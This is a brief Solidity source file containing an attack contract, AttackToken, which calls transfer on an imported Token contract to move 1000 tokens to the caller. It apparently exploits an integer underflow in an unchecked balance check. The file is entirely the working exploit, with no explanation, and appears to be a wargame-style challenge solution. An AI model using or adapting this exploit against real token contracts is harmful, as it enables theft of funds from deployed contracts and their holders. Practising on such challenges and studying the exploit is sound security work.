// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Token.sol';

contract AttackToken {
    Token token;

    constructor(address _addy) public {
        token = Token(_addy);
    }
    function attackToken() public {
        token.transfer(msg.sender, 1000);
    }

}